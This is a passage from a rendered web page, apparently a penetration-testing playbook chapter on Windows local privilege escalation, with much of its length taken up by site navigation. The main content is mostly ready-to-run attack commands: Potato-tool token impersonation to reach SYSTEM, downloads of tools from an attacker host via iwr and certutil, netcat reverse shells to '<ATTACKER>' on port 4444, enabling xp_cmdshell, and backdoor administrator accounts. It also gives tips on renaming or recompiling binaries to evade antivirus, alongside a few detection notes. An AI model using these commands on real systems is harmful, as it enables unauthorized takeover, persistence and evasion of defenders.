+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reference
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Reference
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../reference/attack-decision-tree/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attack Decision Tree
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../reference/quick-reference-tools-hash-modes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Quick Reference: Tools & Hash Modes
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../reference/gotchas-tips/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Gotchas & Tips
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#120-where-you-usually-land-what-to-check" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.0 · Where you usually land + what to check
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#121-token-impersonation-seimpersonateprivilege" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.1 · Token Impersonation (SeImpersonatePrivilege)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#122-common-privesc-checks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.2 · Common Privesc Checks
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#123-other-privileges-worth-knowing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.3 · Other privileges worth knowing
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#124-uac-bypass-admin-but-filtered-full-admin-token" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.4 · UAC bypass (admin-but-filtered → full admin token)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#125-worked-end-to-end-chains" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.5 · Worked end-to-end chains
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#126-opsec-detection-defenses" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.6 · OPSEC, detection, defenses
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+    <a href="https://github.com/SowatKheang/ad_attack_playbook/edit/main/docs/12-privilege-escalation-local.md" title="Edit this page" class="md-content__button md-icon" rel="edit">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg>
+    </a>
+  
+  
+
+
+<h1 id="12-privilege-escalation-local">12 · Privilege Escalation (Local)<a class="headerlink" href="#12-privilege-escalation-local" title="Permanent link">¶</a></h1>
+<blockquote>
+<p>Service account → SYSTEM via SeImpersonate, unquoted paths, AlwaysInstallElevated.</p>
+</blockquote>
+<div class="admonition note">
+<p class="admonition-title">Phase overview</p>
+<p>Once you have a shell as a service account (IIS, MSSQL, etc.), check whoami /priv. <strong><em><code>SeImpersonatePrivilege</code></em></strong> is the golden ticket; it lets you impersonate any token that comes your way, and Potato-family tools coerce a SYSTEM token into doing exactly that. <code>WinPEAS</code> automates the rest of the privesc surface.</p>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">First-five-minutes triage</p>
+<p>The order that finds wins fastest:</p>
+<ol>
+<li><code>whoami /priv</code> — token privileges (SeImpersonate, SeBackup, SeDebug, SeLoadDriver, etc.)</li>
+<li><code>whoami /groups</code> — implicit group memberships (BUILTIN\Administrators with UAC filter, Backup Operators, etc.)</li>
+<li><code>systeminfo</code> — OS version + patch level (drives Potato selection and kernel exploit feasibility)</li>
+<li><code>winpeasx64.exe</code> — runs the rest while you're reading the above</li>
+<li><code>cmdkey /list</code> + <code>dir C:\Users\*\Desktop</code> — quick cred and loot pass</li>
+</ol>
+<p>If you see SeImpersonate or SeAssignPrimaryToken, stop reading and go straight to #12.1. That's a five-second SYSTEM.</p>
+</div>
+<h3 id="120-where-you-usually-land-what-to-check">12.0 · Where you usually land + what to check<a class="headerlink" href="#120-where-you-usually-land-what-to-check" title="Permanent link">¶</a></h3>
+<div class="admonition info">
+<p class="admonition-title">Mapping context to attack surface</p>
+<table>
+<thead>
+<tr>
+<th>Initial context</th>
+<th>Most-likely privesc path</th>
+<th>First check</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IIS app pool (<code>iis apppool\*</code>)</td>
+<td>SeImpersonate → Potato</td>
+<td><code>whoami /priv</code></td>
+</tr>
+<tr>
+<td>MSSQL via xp_cmdshell (<code>nt service\mssqlserver</code>)</td>
+<td>SeImpersonate → Potato</td>
+<td><code>whoami /priv</code></td>
+</tr>
+<tr>
+<td>Custom Windows service account</td>
+<td>SeImpersonate → Potato; cmdkey</td>
+<td><code>whoami /priv</code> + <code>cmdkey /list</code></td>
+</tr>
+<tr>
+<td>Standard domain user RDP/WinRM</td>
+<td>Service misconfig, AlwaysInstallElevated, unquoted paths</td>
+<td><code>winpeas</code> full sweep</td>
+</tr>
+<tr>
+<td>Local admin but UAC-filtered</td>
+<td>UAC bypass → full admin token</td>
+<td><code>whoami /groups</code> (look for filtered SID)</td>
+</tr>
+<tr>
+<td>Backup Operators member</td>
+<td>SeBackup/SeRestore → SAM/SYSTEM hive dump</td>
+<td><code>whoami /priv</code></td>
+</tr>
+<tr>
+<td>Domain admin context (downgraded)</td>
+<td>Already won — pivot to DC</td>
+<td>n/a</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="121-token-impersonation-seimpersonateprivilege">12.1 · Token Impersonation (SeImpersonatePrivilege)<a class="headerlink" href="#121-token-impersonation-seimpersonateprivilege" title="Permanent link">¶</a></h3>
+<div class="admonition info">
+<p class="admonition-title">Why this works / how it chains</p>
+<p><code>GodPotato</code> is the most reliable on Server 2019/2022; it abuses RPC to coerce a SYSTEM token. PrintSpoofer works on most Windows 10/Server 2019. <code>RoguePotato</code> and <code>JuicyPotato</code> exist for older systems with different OXID resolution paths. Pick the one for your target's OS.</p>
+<p>Mechanic: holding <code>SeImpersonatePrivilege</code> means you can call <code>ImpersonateLoggedOnUser</code>/<code>CreateProcessWithToken</code> with <strong>any</strong> token handle you obtain. The Potato family's job is to trick a higher-privileged process (usually <code>NT AUTHORITY\SYSTEM</code>) into authenticating to a local NTLM endpoint you control, capture that authentication, and hand the resulting token to your impersonation API. Different Potatoes use different coercion mechanics (Print Spooler RPC, DCOM OXID resolution, RPC over named pipes), which is why some work on certain OS versions and not others.</p>
+</div>
+<div class="admonition warning">
+<p class="admonition-title">What leads here</p>
+<ul>
+<li>Shell as a service account (IIS, MSSQL, custom app pool, etc.)</li>
+<li>whoami /priv shows SeImpersonatePrivilege Enabled</li>
+<li><strong>OR</strong> SeAssignPrimaryTokenPrivilege Enabled (equivalent capability for our purposes)</li>
+<li>Pre-installed service accounts that grant this by default: <code>IIS APPPOOL\*</code>, <code>NT SERVICE\MSSQLSERVER</code>, <code>NT AUTHORITY\NETWORK SERVICE</code>, <code>NT AUTHORITY\LOCAL SERVICE</code> (with caveats)</li>
+</ul>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">Pick the right Potato for the OS</p>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Win &#8542;</th>
+<th>Win 10</th>
+<th>Server 2012 R2</th>
+<th>Server 2016</th>
+<th>Server 2019</th>
+<th>Server 2022</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>JuicyPotato</td>
+<td>✅</td>
+<td>✅ (early builds)</td>
+<td>✅</td>
+<td>✅</td>
+<td>❌</td>
+<td>❌</td>
+</tr>
+<tr>
+<td>RoguePotato</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>partial</td>
+</tr>
+<tr>
+<td>PrintSpoofer</td>
+<td>❌</td>
+<td>✅</td>
+<td>❌</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅ (if Spooler running)</td>
+</tr>
+<tr>
+<td>GodPotato</td>
+<td>❌</td>
+<td>✅ (1809+)</td>
+<td>❌</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>EfsPotato</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅ (anytime EFS RPC reachable)</td>
+</tr>
+<tr>
+<td>SweetPotato</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅ (auto-picks variant)</td>
+</tr>
+</tbody>
+</table>
+<p>Order of preference today: <strong>GodPotato → PrintSpoofer → EfsPotato → RoguePotato → JuicyPotato</strong>. SweetPotato is a "let it pick" all-in-one for when you're unsure.</p>
+</div>
+<div class="language-powershell highlight"><span class="filename">Check + run the right potato</span><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c"># Some examples:</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="c"># Check</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="s2">&quot;impersonate\|token&quot;</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="c"># GodPotato (Win2019/2022 - most reliable)</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="p">.\</span><span class="n">GodPotato</span><span class="p">.</span><span class="n">exe</span> <span class="n">-cmd</span> <span class="s2">&quot;cmd /c whoami&quot;</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="p">.\</span><span class="n">GodPotato</span><span class="p">.</span><span class="n">exe</span> <span class="n">-cmd</span> <span class="s2">&quot;cmd /c net localgroup administrators domain\user /add&quot;</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="p">.\</span><span class="n">GodPotato</span><span class="p">.</span><span class="n">exe</span> <span class="n">-cmd</span> <span class="s2">&quot;cmd /c net user hacker Pass123! /add &amp;&amp; net localgroup administrators hacker /add&quot;</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="c"># PrintSpoofer (Win10/Server 2019)</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="p">.\</span><span class="n">PrintSpoofer</span><span class="p">.</span><span class="n">exe</span> <span class="n">-i</span> <span class="n">-c</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="p">.\</span><span class="n">PrintSpoofer</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="s2">&quot;powershell -c whoami&quot;</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="c"># RoguePotato (older systems)</span>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="p">.\</span><span class="n">RoguePotato</span><span class="p">.</span><span class="n">exe</span> <span class="n">-r</span> <span class="p">&lt;</span><span class="n">ATTACKER_IP</span><span class="p">&gt;</span> <span class="n">-e</span> <span class="s2">&quot;cmd.exe&quot;</span> <span class="n">-l</span> <span class="n">9999</span>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="c"># JuicyPotato (Server 2016/Win10)</span>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="p">.\</span><span class="n">JuicyPotato</span><span class="p">.</span><span class="n">exe</span> <span class="n">-l</span> <span class="n">1337</span> <span class="n">-p</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">-t</span> <span class="p">*</span> <span class="n">-c</span> <span class="p">{</span><span class="n">CLSID</span><span class="p">}</span>
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="c"># Upload via WinRM then execute via xp_cmdshell</span>
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="c"># evil-winrm: upload /tmp/cb.exe C:\ProgramData\cb.exe</span>
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a><span class="c"># SQL: EXEC xp_cmdshell &#39;C:\ProgramData\cb.exe -cmd &quot;cmd.exe /c command&quot;&#39;</span>
+</span></code></pre></div>
+<div class="language-powershell highlight"><span class="filename">More Potato variants worth knowing</span><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c"># EfsPotato (uses MS-EFSR locally, avoids Print Spooler dependency)</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="p">.\</span><span class="n">EfsPotato</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&quot;whoami /all&quot;</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="p">.\</span><span class="n">EfsPotato</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&quot;net user hacker Pass123! /add&quot;</span> <span class="n">2</span>  <span class="c"># 2 = use a different EFS pipe</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="c"># SharpEfsPotato (C# port, friendlier with .NET runners)</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="p">.\</span><span class="n">SharpEfsPotato</span><span class="p">.</span><span class="n">exe</span> <span class="n">-p</span> <span class="s2">&quot;cmd.exe&quot;</span> <span class="n">-a</span> <span class="s2">&quot;/c whoami&quot;</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="c"># SweetPotato (auto-picks the working variant)</span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="p">.\</span><span class="n">SweetPotato</span><span class="p">.</span><span class="n">exe</span> <span class="n">-e</span> <span class="n">EfsRpc</span> <span class="n">-p</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">-a</span> <span class="s2">&quot;/c whoami&quot;</span>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="p">.\</span><span class="n">SweetPotato</span><span class="p">.</span><span class="n">exe</span> <span class="n">-e</span> <span class="n">PrintSpoofer</span> <span class="n">-p</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">-a</span> <span class="s2">&quot;/c whoami&quot;</span>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="c"># RoguePotato when the host can&#39;t reach the internet but can reach you on 135</span>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="c"># Run on attacker:</span>
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="n">sudo</span> <span class="n">socat</span> <span class="n">TCP-LISTEN</span><span class="p">:</span><span class="n">135</span><span class="p">,</span><span class="n">fork</span><span class="p">,</span><span class="n">reuseaddr</span> <span class="n">TCP</span><span class="p">:&lt;</span><span class="n">TARGET_IP</span><span class="p">&gt;:</span><span class="n">9999</span>
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="c"># On target:</span>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="p">.\</span><span class="n">RoguePotato</span><span class="p">.</span><span class="n">exe</span> <span class="n">-r</span> <span class="p">&lt;</span><span class="n">ATTACKER_IP</span><span class="p">&gt;</span> <span class="n">-e</span> <span class="s2">&quot;C:\ProgramData\cb.exe&quot;</span> <span class="n">-l</span> <span class="n">9999</span>
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="c"># Reverse shell payload via cmd</span>
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="p">.\</span><span class="n">GodPotato</span><span class="p">.</span><span class="n">exe</span> <span class="n">-cmd</span> <span class="s2">&quot;cmd /c \\\\&lt;ATTACKER&gt;\\share\\nc.exe &lt;ATTACKER&gt; 4444 -e cmd.exe&quot;</span>
+</span></code></pre></div>
+<div class="admonition example">
+<p class="admonition-title">Chain 1: MSSQL xp_cmdshell → SeImpersonate → SYSTEM</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c"># Position: SQL injection or stolen creds with sysadmin on MSSQL.</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="c"># 1) Confirm xp_cmdshell available; enable if needed</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="n">impacket-mssqlclient</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">svc_sql</span><span class="p">:</span><span class="s1">&#39;Pass123!&#39;</span><span class="p">@&lt;</span><span class="n">TARGET</span><span class="p">&gt;</span> <span class="n">-windows-auth</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="n">SQL</span><span class="p">&gt;</span> <span class="n">EXEC</span> <span class="n">sp_configure</span> <span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span> <span class="n">1</span><span class="p">;</span> <span class="n">RECONFIGURE</span><span class="p">;</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="n">SQL</span><span class="p">&gt;</span> <span class="n">EXEC</span> <span class="n">sp_configure</span> <span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span> <span class="n">1</span><span class="p">;</span> <span class="n">RECONFIGURE</span><span class="p">;</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="n">SQL</span><span class="p">&gt;</span> <span class="n">EXEC</span> <span class="n">xp_cmdshell</span> <span class="s1">&#39;whoami /priv&#39;</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="c"># → SeImpersonatePrivilege Enabled (NT SERVICE\MSSQLSERVER)</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="c"># 2) Stage GodPotato + a payload</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="n">SQL</span><span class="p">&gt;</span> <span class="n">EXEC</span> <span class="n">xp_cmdshell</span> <span class="s1">&#39;powershell -c &quot;iwr http://&lt;ATTACKER&gt;/GodPotato.exe -o C:\ProgramData\gp.exe&quot;&#39;</span>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="n">SQL</span><span class="p">&gt;</span> <span class="n">EXEC</span> <span class="n">xp_cmdshell</span> <span class="s1">&#39;powershell -c &quot;iwr http://&lt;ATTACKER&gt;/nc.exe -o C:\ProgramData\nc.exe&quot;&#39;</span>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="c"># 3) Spawn a SYSTEM reverse shell</span>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="n">SQL</span><span class="p">&gt;</span> <span class="n">EXEC</span> <span class="n">xp_cmdshell</span> <span class="s1">&#39;C:\ProgramData\gp.exe -cmd &quot;C:\ProgramData\nc.exe &lt;ATTACKER&gt; 4444 -e cmd.exe&quot;&#39;</span>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="c"># 4) Catch on attacker</span>
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="n">nc</span> <span class="n">-lvnp</span> <span class="n">4444</span>
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="n">whoami</span>
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="n">nt</span> <span class="n">authority</span><span class="p">\</span><span class="n">system</span>
+</span></code></pre></div>
+</div>
+<div class="admonition example">
+<p class="admonition-title">Chain 2: IIS App Pool → SYSTEM via PrintSpoofer</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c"># Position: webshell on IIS, running as IIS APPPOOL\DefaultAppPool</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="c"># 1) Confirm the priv</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="c"># → SeImpersonatePrivilege Enabled</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="c"># 2) Drop PrintSpoofer (writable: C:\Windows\Temp, C:\Users\Public)</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="n">certutil</span> <span class="n">-urlcache</span> <span class="n">-split</span> <span class="o">-f</span> <span class="n">http</span><span class="p">://&lt;</span><span class="n">ATTACKER</span><span class="p">&gt;/</span><span class="n">PrintSpoofer</span><span class="p">.</span><span class="n">exe</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">ps</span><span class="p">.</span><span class="n">exe</span>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="c"># 3) Interactive (-i) gives a TTY-like SYSTEM shell. Through a webshell, prefer -c:</span>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">ps</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="s2">&quot;powershell -enc &lt;BASE64_REV_SHELL&gt;&quot;</span>
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="c"># 4) Persistence (after pivoting to a real shell)</span>
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="n">net</span> <span class="n">user</span> <span class="n">backdoor</span> <span class="s1">&#39;Pa$$w0rd!&#39;</span> <span class="p">/</span><span class="n">add</span>
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="n">net</span> <span class="n">localgroup</span> <span class="n">administrators</span> <span class="n">backdoor</span> <span class="p">/</span><span class="n">add</span>
+</span></code></pre></div>
+</div>
+<div class="admonition danger">
+<p class="admonition-title">Detection / OPSEC</p>
+<ul>
+<li><strong>Sysmon EventID 1</strong> for the Potato binary launch + EventID 10 (CreateRemoteThread) when it touches lsass-adjacent processes</li>
+<li>The default binary names (<code>GodPotato.exe</code>, <code>PrintSpoofer.exe</code>) are signatured by every modern AV. Rename, recompile from source with mods, or use SharpEfsPotato in-memory via execute-assembly</li>
+<li>Print Spooler-based variants (PrintSpoofer) leave Spooler service event entries; EFS variants leave RPC-call traces in EFS logs</li>
+<li>4624 logon events show <code>NT AUTHORITY\SYSTEM</code> Logon Type 9 (NewCredentials) or 2 (Interactive) from a service-account-launched parent process — anomalous parentage</li>
+<li>Disable Print Spooler and you defeat the PrintSpoofer family (recommend this in the report)</li>
+</ul>
+</div>
+<h3 id="122-common-privesc-checks">12.2 · Common Privesc Checks<a class="headerlink" href="#122-common-privesc-checks" title="Permanent link">¶</a></h3>
+<div class="admonition info">
+<p class="admonition-title">Why this works / how it chains</p>
+<p><code>WinPEAS</code> and <code>PowerUp</code> are the workhorses. They flag <strong><em><code>AlwaysInstallElevated</code></em></strong> (any user can install MSI as SYSTEM), unquoted service paths (drop your own exe in the gap), writable service binaries, stored credentials in cmdkey, and writable scheduled task XML.</p>
